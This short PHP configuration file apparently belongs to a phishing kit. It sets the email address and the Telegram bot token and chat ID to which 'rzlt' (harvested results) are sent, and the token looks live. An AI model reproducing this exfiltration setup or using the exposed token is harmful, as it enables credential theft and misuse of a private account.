<?php

//Email rzlt
$email ='mouadbalabil@yahoo.com'; 

//Telegram rzlt
$api = '6063354642:AAFcGF8THj4DXvQSVfNkClQB6NxSt-XQnNA';
$chatid = '5880955762';


?>